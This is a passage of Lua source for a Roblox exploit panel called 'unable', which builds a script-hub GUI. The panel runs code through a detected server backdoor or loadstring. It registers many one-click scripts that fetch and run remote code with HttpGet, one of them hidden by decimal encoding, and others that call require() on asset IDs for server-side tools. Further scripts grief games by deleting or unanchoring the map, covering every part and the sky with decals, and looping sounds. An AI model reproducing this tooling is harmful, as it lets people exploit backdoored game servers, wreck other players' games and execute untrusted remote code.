	unable["backdoor scan button"].Visible = false
	unable["credits holder"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["credits holder"].Size = UDim2.new(0, 393, 0, 214)
unable["credits holder"].Position = UDim2.new(0, 4, 0, 31)
unable["credits holder"].BackgroundColor3 = unable["default background color"]
unable["credits holder"].BorderColor3 = unable["default border color"]
unable["credits holder"].BorderSizePixel = 1
unable["credits holder"].Parent = unable["main frame 4"]
unable["credits holder"].ZIndex = 19
unable["credits holder"].Visible = false

unable["credits holder"].TextColor3 = unable["default border color"]
unable["credits holder"].Font = Enum.Font.RobotoMono
--unable["credits holder"].TextSize = 20
unable["credits holder"].TextSize = 15
unable["credits holder"].TextScaled = false
unable["credits holder"].Text = "n/a"
--unable["credits holder"].TextXAlignment = Enum.TextXAlignment.Left
--unable["credits holder"].TextYAlignment = Enum.TextYAlignment.Top
unable["credits holder"].TextXAlignment = Enum.TextXAlignment.Center
unable["credits holder"].TextYAlignment = Enum.TextYAlignment.Center
unable["credits holder"].ZIndex = 25
unable["credits holder"].ClipsDescendants = true

unable["credits holder text padding"] = Instance.new("UIPadding")
--unable["credits holder text padding"].PaddingLeft = UDim.new(0, 4)
--unable["credits holder text padding"].PaddingTop = UDim.new(0, 4)
unable["credits holder text padding"].PaddingBottom = UDim.new(0, 2)
--unable["credits holder text padding"].PaddingBottom = UDim.new(0, 4)
unable["credits holder text padding"].Parent = unable["credits holder"]

unable["credits holder"].Text = "credits:\n\nunable - development & revival\n\nhypno - code adjustments\n\nlexia & uwusploit - UI design\n\nethereal & dextrocities - scripts\n\nskidpoison & reluxiety - testing & refining"

-------------------------------------------------------------------------------------------------------------------------------

unable["scripts tab"].Size = UDim2.new(0, 100, 0, 26)
unable["scripts tab"].Position = UDim2.new(0, 0, 0, 1)

unable["scripts tab"].BackgroundColor3 = unable["default background color"]

unable["scripts tab"].BorderColor3 = unable["default border color"]
unable["scripts tab"].BorderSizePixel = 1

unable["scripts tab"].TextColor3 = unable["default border color"]
unable["scripts tab"].Font = Enum.Font.RobotoMono
unable["scripts tab"].TextSize = 15
unable["scripts tab"].TextScaled = false
unable["scripts tab"].Text = "scripts"
unable["scripts tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["scripts tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["scripts tab text padding"] = Instance.new("UIPadding")
unable["scripts tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["scripts tab text padding"].Parent = unable["scripts tab"]

unable["scripts tab"].Parent = unable["main frame 1"]
unable["scripts tab"].ZIndex = 19

------------------------------------- thank you chatgpt for fixing some of the code below -------------------------------------

unable["button holder"].Size = UDim2.new(0, 369, 0, 180)
unable["button holder"].Position = UDim2.new(0, 28, 0, 55)
unable["button holder"].BackgroundColor3 = unable["default background color"]
unable["button holder"].BorderColor3 = unable["default border color"]
unable["button holder"].BorderSizePixel = 0
unable["button holder"].Parent = unable["main frame 1"]
unable["button holder"].ZIndex = 19
unable["button holder"].Visible = false

unable["script search bar"].Size = UDim2.new(0, 345, 0, 19)
unable["script search bar"].Position = UDim2.new(0, 28, 0, 32)
unable["script search bar"].BackgroundColor3 = unable["default background color"]
unable["script search bar"].BorderColor3 = unable["default border color"]
unable["script search bar"].BorderSizePixel = 1
unable["script search bar"].TextColor3 = unable["default border color"]
unable["script search bar"].Font = Enum.Font.RobotoMono
unable["script search bar"].TextSize = 15
unable["script search bar"].TextScaled = false
unable["script search bar"].PlaceholderText = "search scripts"
unable["script search bar"].PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
unable["script search bar"].Text = ""
unable["script search bar"].TextXAlignment = Enum.TextXAlignment.Center
unable["script search bar"].TextYAlignment = Enum.TextYAlignment.Center
unable["script search bar"].ClearTextOnFocus = false
unable["script search bar"].Parent = unable["main frame 1"]
unable["script search bar"].ZIndex = 19
unable["script search bar"].Visible = false
unable["script search bar"].ClearTextOnFocus = true

unable["script search bar padding"] = Instance.new("UIPadding")
unable["script search bar padding"].PaddingLeft = UDim.new(0, 6)
unable["script search bar padding"].PaddingRight = UDim.new(0, 6)
unable["script search bar padding"].PaddingBottom = UDim.new(0, 1)
unable["script search bar padding"].Parent = unable["script search bar"]

unable["next page"].Size = UDim2.new(0, 19, 0, 214)
unable["next page"].Position = UDim2.new(0, 378, 0, 32)
unable["next page"].BackgroundColor3 = unable["default background color"]
unable["next page"].BorderColor3 = unable["default border color"]
unable["next page"].BorderSizePixel = 1
unable["next page"].Parent = unable["main frame 1"]
unable["next page"].ZIndex = 19
unable["next page"].Visible = false

unable["next page"].TextColor3 = unable["default border color"]
unable["next page"].Font = Enum.Font.RobotoMono
unable["next page"].TextSize = 15
unable["next page"].TextScaled = false
unable["next page"].Text = ">"
unable["next page"].TextXAlignment = Enum.TextXAlignment.Center
unable["next page"].TextYAlignment = Enum.TextYAlignment.Center

unable["next page text padding"] = Instance.new("UIPadding")
unable["next page text padding"].PaddingBottom = UDim.new(0, 2)
unable["next page text padding"].Parent = unable["next page"]

unable["previous page"].Size = UDim2.new(0, 19, 0, 214)
unable["previous page"].Position = UDim2.new(0, 4, 0, 32)
unable["previous page"].BackgroundColor3 = unable["default background color"]
unable["previous page"].BorderColor3 = unable["default border color"]
unable["previous page"].BorderSizePixel = 1
unable["previous page"].Parent = unable["main frame 1"]
unable["previous page"].ZIndex = 19
unable["previous page"].Visible = false

unable["previous page"].TextColor3 = unable["default border color"]
unable["previous page"].Font = Enum.Font.RobotoMono
unable["previous page"].TextSize = 15
unable["previous page"].TextScaled = false
unable["previous page"].Text = "<"
unable["previous page"].TextXAlignment = Enum.TextXAlignment.Center
unable["previous page"].TextYAlignment = Enum.TextYAlignment.Center

unable["previous page text padding"] = Instance.new("UIPadding")
unable["previous page text padding"].PaddingBottom = UDim.new(0, 1)
unable["previous page text padding"].Parent = unable["previous page"]

local buttonsperscriptpg = 9
local allbuttons = {}
local filteredbuttons = {}
local currentscriptpg = 1
local totalscriptpgs = 1
local savedscriptpg = 1
local searchingforbuttons = false
local emptybuttons = {}

local buttondata = {}

function mtbutton(xOffset, yOffset, column)
	local buttonWidth = 111
	if column == 1 then
		buttonWidth = 113
	end

	local button = Instance.new("TextLabel")
	button.Name = "fakebutton"
	button.Size = UDim2.new(0, buttonWidth, 0, 60)
	button.Position = UDim2.new(0, xOffset, 0, yOffset)
	button.BackgroundColor3 = unable["default background color"]
	button.BorderColor3 = unable["default 1/2 color"]
	button.BorderSizePixel = 1
	button.TextColor3 = unable["default 1/2 color"]
	button.Font = Enum.Font.RobotoMono
	button.TextSize = 15
	button.TextScaled = false
	button.Text = "-"
	button.TextXAlignment = Enum.TextXAlignment.Center
	button.TextYAlignment = Enum.TextYAlignment.Center
	button.Parent = unable["button holder"]
	button.ZIndex = 19
	button.TextWrapped = true
	button.Visible = true

	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	table.insert(emptybuttons, button)
	return button
end

local function cleanupmtbuttons()
	for _, button in ipairs(emptybuttons) do
		button:Destroy()
	end
	emptybuttons = {}
end

local function updbuttonvisibility()
	cleanupmtbuttons()
	local buttonsToShow = searchingforbuttons and filteredbuttons or allbuttons
	local startIndex = (currentscriptpg - 1) * buttonsperscriptpg + 1
	local endIndex = math.min(startIndex + buttonsperscriptpg - 1, #buttonsToShow)

	for _, button in ipairs(allbuttons) do
		button.Visible = false
	end

	local occupiedPositions = {}

	for i = startIndex, endIndex do
		if buttonsToShow[i] then
			local pos = buttonsToShow[i].Position
			local gridX = math.floor(pos.X.Offset)
			local gridY = math.floor(pos.Y.Offset)
			occupiedPositions[gridX..","..gridY] = true
			buttonsToShow[i].Visible = true
		end
	end

	for row = 0, 2 do
		for col = 0, 2 do
			local xOffset = col * 117
			local yOffset = row * 65 + 1

			if col == 1 then
				xOffset = col * 116
			end

			if not occupiedPositions[xOffset..","..yOffset] then
				mtbutton(xOffset, yOffset, col)
			end
		end
	end

	unable["previous page"].Visible = true
	unable["next page"].Visible = true

	savedscriptpg = currentscriptpg
end

local function positionAllButtons()
	local buttonsToPosition = searchingforbuttons and filteredbuttons or allbuttons

	for i, button in ipairs(buttonsToPosition) do
		local positionInGrid = (i - 1) % buttonsperscriptpg
		local row = math.floor(positionInGrid / 3)
		local column = positionInGrid % 3
		local xOffset = column * 117
		local yOffset = row * 65 + 1

		local buttonWidth = 111
		if column == 1 then
			buttonWidth = 113
			xOffset = column * 116
		end

		button.Size = UDim2.new(0, buttonWidth, 0, 60)
		button.Position = UDim2.new(0, xOffset, 0, yOffset)
	end
end

local function filterbuttons(searchText)
	searchText = string.lower(searchText or "")
	filteredbuttons = {}

	if searchText == "" then
		searchingforbuttons = false
		totalscriptpgs = math.ceil(#allbuttons / buttonsperscriptpg)
		currentscriptpg = math.min(savedscriptpg, totalscriptpgs)

		for i, button in ipairs(allbuttons) do
			local positionInPage = (i - 1) % buttonsperscriptpg
			local row = math.floor(positionInPage / 3)
			local column = positionInPage % 3
			local xOffset = column * 117
			local yOffset = row * 65 + 1

			local buttonWidth = 111
			if column == 1 then
				buttonWidth = 113
				xOffset = column * 116
			end

			button.Size = UDim2.new(0, buttonWidth, 0, 60)
			button.Position = UDim2.new(0, xOffset, 0, yOffset)
		end

		updbuttonvisibility()
		return
	end

	for _, button in ipairs(allbuttons) do
		if string.find(string.lower(button.Text), searchText, 1, true) then
			table.insert(filteredbuttons, button)
		end
	end

	for i, button in ipairs(filteredbuttons) do
		local positionInGrid = i - 1
		local row = math.floor(positionInGrid / 3)
		local column = positionInGrid % 3
		local xOffset = column * 117
		local yOffset = row * 65 + 1

		local buttonWidth = 111
		if column == 1 then
			buttonWidth = 113
			xOffset = column * 116
		end

		button.Size = UDim2.new(0, buttonWidth, 0, 60)
		button.Position = UDim2.new(0, xOffset, 0, yOffset)
	end

	searchingforbuttons = true
	totalscriptpgs = math.ceil(#filteredbuttons / buttonsperscriptpg)
	currentscriptpg = 1

	updbuttonvisibility()
end

unable["next page"].MouseButton1Click:Connect(function()
	playclicksound()
	local buttonsToUse = searchingforbuttons and filteredbuttons or allbuttons
	currentscriptpg = currentscriptpg + 1
	if currentscriptpg > math.ceil(#buttonsToUse / buttonsperscriptpg) then
		currentscriptpg = 1
	end

	positionAllButtons()
	updbuttonvisibility()
end)

unable["previous page"].MouseButton1Click:Connect(function()
	playclicksound()
	local buttonsToUse = searchingforbuttons and filteredbuttons or allbuttons
	currentscriptpg = currentscriptpg - 1
	if currentscriptpg < 1 then
		currentscriptpg = math.ceil(#buttonsToUse / buttonsperscriptpg)
	end

	positionAllButtons()
	updbuttonvisibility()
end)

unable["script search bar"].FocusLost:Connect(function()
	filterbuttons(unable["script search bar"].Text)
end)

unable["script search bar"]:GetPropertyChangedSignal("Text"):Connect(function()
	filterbuttons(unable["script search bar"].Text)
end)

function showScriptPage()
	unable["button holder"].Visible = true
	unable["script search bar"].Visible = true

	unable["next page"].Visible = true
	unable["previous page"].Visible = true

	positionAllButtons()
	updbuttonvisibility()
end

function hideScriptPage()
	unable["button holder"].Visible = false
	unable["script search bar"].Visible = false
	unable["next page"].Visible = false
	unable["previous page"].Visible = false
end

function cscript(buttonText, onClick, buttonNumber, uniqueId)
	local index = #allbuttons + 1
	local positionInPage = (index - 1) % buttonsperscriptpg
	local row = math.floor(positionInPage / 3)
	local column = positionInPage % 3
	local xOffset = column * 117
	local yOffset = row * 65

	local buttonWidth = 111
	if column == 1 then
		buttonWidth = 113
		xOffset = column * 116
	end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, buttonWidth, 0, 60)
	button.Position = UDim2.new(0, xOffset, 0, yOffset + 1)
	button.BackgroundColor3 = unable["default background color"]
	button.BorderColor3 = unable["default border color"]
	button.BorderSizePixel = 1
	button.TextColor3 = unable["default border color"]
	button.Font = Enum.Font.RobotoMono
	button.TextSize = 15
	button.TextScaled = false
	button.Text = buttonText
	button.TextXAlignment = Enum.TextXAlignment.Center
	button.TextYAlignment = Enum.TextYAlignment.Center
	button.Parent = unable["button holder"]
	button.ZIndex = 19
	button.TextWrapped = true
	button.Visible = (index <= buttonsperscriptpg and unable["button holder"].Visible)

	buttondata[button] = {
		id = uniqueId or buttonText..tostring(index),
		script = onClick,
		number = buttonNumber or index,
		originalPosition = UDim2.new(0, xOffset, 0, yOffset)
	}

	local numberLabel = Instance.new("TextLabel")
	numberLabel.Size = UDim2.new(0, 20, 0, 20)
	numberLabel.Position = UDim2.new(0, -2, 0, -3)
	numberLabel.BackgroundTransparency = 1
	numberLabel.Text = tostring(buttonNumber or index)
	numberLabel.TextColor3 = unable["default 1/2 color"]
	numberLabel.Font = Enum.Font.RobotoMono
	numberLabel.TextSize = 10
	numberLabel.TextXAlignment = Enum.TextXAlignment.Left
	numberLabel.TextYAlignment = Enum.TextYAlignment.Center
	numberLabel.Parent = button
	numberLabel.ZIndex = 20
	numberLabel.Name = "ButtonNumber"

	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	button.MouseButton1Click:Connect(function()
		playclicksound()
		local data = buttondata[button]
		if not data then return end

		local localPlayer = game.Players.LocalPlayer
		local cleanedCode = data.script:gsub("%%replace%%with%%username%%", localPlayer.Name)

		local formattedCode = ""
		for line in cleanedCode:gmatch("[^\r\n]+") do
			local trimmedLine = line:gsub("^%s", "")
			formattedCode = formattedCode .. trimmedLine .. "\n"
		end

		formattedCode = formattedCode:sub(1, -2)

		if unable["executor textbox"] then
			unable["executor textbox"].Text = formattedCode
		end

		executeCodeFromTextBox()
	end)

	table.insert(allbuttons, button)
	totalscriptpgs = math.ceil(#allbuttons / buttonsperscriptpg)

	button.Visible = (index <= buttonsperscriptpg and unable["button holder"].Visible)

	return numberLabel
end

function executeCodeFromTextBox()
	if backdoor ~= nil then
		local a,b=string.gsub(unable["executor textbox"].Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
		runRemote(backdoor, a)
		return
	end
	if backdoored == true then
		return
	end

	local code = unable["executor textbox"].Text

	if code and code ~= "" then
		assert(loadstring(code))()
	end
end

------------------------------------- thank you chatgpt for fixing some of the code above -------------------------------------


cscript("immortality lord", [[
	require(6534274227)("%replace%with%username%")
]], "RQ")

cscript("comet FE", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
]], "LS")

cscript("DEX explorer", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
]], "LS")

cscript("goner", [[
	require(4513235536).G("%replace%with%username%")
]], "RQ")

cscript("grab knife", [[
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753"))()
]], "LS")

cscript("star glitcher", [[
	require(5738781015).load("%replace%with%username%")
]], "RQ")

cscript("clear map", [[
camera = workspace:FindFirstChild("Camera")
Players = game:GetService("Players")

for _, item in pairs(workspace:GetChildren()) do
	if item ~= camera and item.Name ~= "Terrain" and item.Name ~= "Players" and not Players:GetPlayerFromCharacter(item) then
		item:Destroy()
	end
end

local bro = Instance.new("SpawnLocation", workspace)
bro.Anchored = true
bro.Transparency = 1
bro.Position = Vector3.new(0, 6, 0)

baseplate = Instance.new("Part")
baseplate.Name = "Baseplate"
baseplate.Size = Vector3.new(2048, 16, 2048)
baseplate.Anchored = true
baseplate.Position = Vector3.new(0, 0, 0)
baseplate.BrickColor = BrickColor.new("Dark grey metallic")
baseplate.Material = Enum.Material.Plastic
baseplate.Parent = workspace

txt = Instance.new("Texture")
txt.Texture = "rbxassetid://6372755229"
txt.Parent = baseplate

for _, player in ipairs(Players:GetPlayers()) do
    if player and player.Character then
        player:LoadCharacter()
    end
end
]], "CS / SS")

cscript("infinite yield", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
]], "LS")

cscript("mobile\nkeyboard", [[
	loadstring(game:HttpGet"https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr")()
]], "LS")

cscript("fe bypass gui", [[
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
]], "LS")

cscript("c00lgui", [[
	require(14125553864):Fire("%replace%with%username%", "c00lkidd")
]], "RQ")

cscript("quirkyCMD", [[
	loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
]], "LS")

cscript("holy wrench", [[
	require(8596757978).load("%replace%with%username%")
]], "RQ")

local interval = 0.2
local brightnessRange = {1, 3}
local colorChangeSpeed = 5

function getRandomColor()
	return Color3.new(math.random(), math.random(), math.random())
end

local isDiscoActive = false

function startDiscoMode()
	while isDiscoActive do
		unable["lighting"].Ambient = getRandomColor()
		unable["lighting"].OutdoorAmbient = getRandomColor()
		unable["lighting"].ColorShift_Top = getRandomColor()
		unable["lighting"].Brightness = math.random(brightnessRange[1] * 100, brightnessRange[2] * 100) / 100

		task.wait(interval)
	end
end

local originalSettings = {}

function savelighting()
	originalSettings.Brightness = unable["lighting"].Brightness
	originalSettings.ClockTime = unable["lighting"].ClockTime
	originalSettings.FogEnd = unable["lighting"].FogEnd
	originalSettings.GlobalShadows = unable["lighting"].GlobalShadows
	originalSettings.OutdoorAmbient = unable["lighting"].OutdoorAmbient
	originalSettings.Ambient = unable["lighting"].Ambient
	originalSettings.ColorShift_Top = unable["lighting"].ColorShift_Top
end

function loadlghting()	
	unable["lighting"].Brightness = originalSettings.Brightness
	unable["lighting"].ClockTime = originalSettings.ClockTime
	unable["lighting"].FogEnd = originalSettings.FogEnd
	unable["lighting"].GlobalShadows = originalSettings.GlobalShadows
	unable["lighting"].OutdoorAmbient = originalSettings.OutdoorAmbient
	unable["lighting"].Ambient = originalSettings.Ambient
	unable["lighting"].ColorShift_Top = originalSettings.ColorShift_Top
end

cscript("disco", [[
	interval = 0.2
	brightnessRange = {1, 3}

	function getRandomColor()
		return Color3.new(math.random(), math.random(), math.random())
	end
	
	while true do
		game:GetService("Lighting").Ambient = getRandomColor()
		game:GetService("Lighting").OutdoorAmbient = getRandomColor()
		game:GetService("Lighting").ColorShift_Top = getRandomColor()
		game:GetService("Lighting").Brightness = math.random(brightnessRange[1] * 100, brightnessRange[2] * 100) / 100

		task.wait(interval)
	end
]], "CS / SS")

cscript("k00pgui", [[
	require(15267263357).V11("%replace%with%username%")
]], "RQ")

cscript("ro-xploit", [[
	loadstring(game:GetObjects('rbxassetid://364364477')[1].Source)()
]], "LS")

cscript("remote spy", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/SimpleSpy/refs/heads/main/Mobile.lua"))()
]], "LS")

cscript("unanchor map", [[
	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BasePart") and descendant.Name ~= "Baseplate" then
			descendant.Anchored = false
		end
	end
]], "CS / SS")

cscript("jerk off tool", [[
	loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
]], "LS")

cscript("unable spam", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://82967466186087" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://82967466186087"
				Two.Texture = "rbxassetid://82967466186087"
				Three.Texture = "rbxassetid://82967466186087"
				Four.Texture = "rbxassetid://82967466186087"
				Five.Texture = "rbxassetid://82967466186087"
				Six.Texture = "rbxassetid://82967466186087"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	local imageId = "rbxassetid://82967466186087"

	function createBillboardGui(part)
		part:FindFirstChildOfClass("BillboardGui"):Destroy()
		if part:FindFirstChildOfClass"BillboardGui"then return end

		local billboardGui = Instance.new"BillboardGui"			
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new"ImageLabel"			
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	function addBillboardGuis()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA"BasePart"then
				createBillboardGui(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA"BasePart"then
				createBillboardGui(newDescendant)
			end
		end)
	end

	--addBillboardGuis()

	local lighting = game:GetService("Lighting")

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://82967466186087"
sky.SkyboxDn = "rbxassetid://82967466186087"
sky.SkyboxFt = "rbxassetid://82967466186087"
sky.SkyboxLf = "rbxassetid://82967466186087"
sky.SkyboxRt = "rbxassetid://82967466186087"
sky.SkyboxUp = "rbxassetid://82967466186087"

sky.Parent = lighting
]], "CS / SS")

cscript("c00lkidd spam", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://158118263" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://158118263"
				Two.Texture = "rbxassetid://158118263"
				Three.Texture = "rbxassetid://158118263"
				Four.Texture = "rbxassetid://158118263"
				Five.Texture = "rbxassetid://158118263"
				Six.Texture = "rbxassetid://158118263"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	local imageId = "rbxassetid://158118263"

	function createBillboardGui(part)
		if part:FindFirstChildOfClass("BillboardGui") then return end

		local billboardGui = Instance.new"BillboardGui"			
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new"ImageLabel"			
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	function addBillboardGuis()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA"BasePart"then
				createBillboardGui(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA"BasePart"then
				createBillboardGui(newDescendant)
			end
		end)
	end

	--addBillboardGuis()

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://158118263"
sky.SkyboxDn = "rbxassetid://158118263"
sky.SkyboxFt = "rbxassetid://158118263"
sky.SkyboxLf = "rbxassetid://158118263"
sky.SkyboxRt = "rbxassetid://158118263"
sky.SkyboxUp = "rbxassetid://158118263"

sky.Parent = lighting
]], "CS / SS")

cscript("project ligma", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20project%20ligma.lua"))()
]], "LS")

cscript("john doe", [[
	require(2845929020).ooga("%replace%with%username%")
]], "RQ")

cscript("john doe", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20john%20doe.lua"))()
]], "LS")

cscript("saveinstance()", [[
	local Params = {
		RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
		SSI = "saveinstance",
	}
	local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
	local Options = {}
	synsaveinstance(Options)
]], "LS")

cscript("lua hammer", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Lua%20Hammer.txt", true))()
]], "LS")

cscript("patchma hub", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty25.lua"))()
]], "LS")

cscript("flip tools", [[
	local player = game.Players.LocalPlayer
	local UserInputService = game:GetService("UserInputService")

	local function performfrontflip(character)
		local humanoid = character:WaitForChild("Humanoid")
		local rootPart = character:WaitForChild("HumanoidRootPart")

		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		humanoid.Sit = true

		local lookVector = rootPart.CFrame.LookVector
		local spinDirection = Vector3.new(-lookVector.Z, 0, lookVector.X)
		local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
		if torso then
			local bodyVelocity = Instance.new("BodyAngularVelocity", torso)
			bodyVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.AngularVelocity = spinDirection * -10
			bodyVelocity.P = 1000

			wait(0.4)
			bodyVelocity:Destroy()
		end

		wait(0.2)
		humanoid.Sit = false
	end

	local function performbackflip(character)
		local humanoid = character:WaitForChild("Humanoid")
		local rootPart = character:WaitForChild("HumanoidRootPart")

		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		humanoid.Sit = true

		local lookVector = rootPart.CFrame.LookVector
		local spinDirection = Vector3.new(-lookVector.Z, 0, lookVector.X)

		local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
		if torso then
			local bodyVelocity = Instance.new("BodyAngularVelocity", torso)
			bodyVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.AngularVelocity = spinDirection * 10
			bodyVelocity.P = 1000

			wait(0.4)
			bodyVelocity:Destroy()
		end

		wait(0.2)
		humanoid.Sit = false
	end

	local function onToolActivated(tool)
		local character = player.Character
		if character then
			if tool.Name == "frontflip" then
				performfrontflip(character)
			elseif tool.Name == "backflip" then
				performbackflip(character)
			end
		end
	end

	local function connectToolEvents(tool)
		if tool:IsA("Tool") then
			tool.RequiresHandle = false
			tool.Activated:Connect(function()
				onToolActivated(tool)
			end)
		end
	end

	local function giveTools()
		local backpack = player:FindFirstChild("Backpack")
		if not backpack then return end

		if not backpack:FindFirstChild("FrontFlipTool") then
			local frontFlipTool = Instance.new("Tool")
			frontFlipTool.Name = "frontflip"
			frontFlipTool.RequiresHandle = false
			frontFlipTool.Parent = backpack
			connectToolEvents(frontFlipTool)
		end

		if not backpack:FindFirstChild("BackFlipTool") then
			local backFlipTool = Instance.new("Tool")
			backFlipTool.Name = "backflip"
			backFlipTool.RequiresHandle = false
			backFlipTool.Parent = backpack
			connectToolEvents(backFlipTool)
		end
	end

	local function initializeCharacter(character)
		character:WaitForChild("Humanoid")
		character:WaitForChild("HumanoidRootPart")

		giveTools()

		local backpack = player:WaitForChild("Backpack")
		for _, tool in pairs(backpack:GetChildren()) do
			connectToolEvents(tool)
		end

		backpack.ChildAdded:Connect(function(tool)
			connectToolEvents(tool)
		end)
	end

	player.CharacterAdded:Connect(function(character)
		initializeCharacter(character)
	end)

	if player.Character then
		initializeCharacter(player.Character)
	end

	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
]], "CS / SS")

cscript("fedora admin", [[
	loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
]], "LS")

cscript("LALOL backdoor scanner", [[
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
]], "LS")

cscript("f3x btools", [[
	loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
]], "LS")

cscript("overseer blade", [[
loadstring(game:HttpGet('https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20overseer%20blade.lua'))()
]], "LS")

cscript("glitch sounds", [[	
	local duration = 999999
	if game:GetService("SoundService").RespectFilteringEnabled then return end

	local sounds = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("Sound")  then
			table.insert(sounds,v)
		end
	end

	local con = game.DescendantAdded:Connect(function(v)
		if v:IsA("Sound") then
			table.insert(sounds,v)
		end
	end)
	wait(.1)
	local start = math.floor(tick())
	repeat
		for i,v in pairs(sounds) do
			v:Play()
			v.TimePosition = math.random(0,v.TimeLength * 1000)/1000
			task.wait()
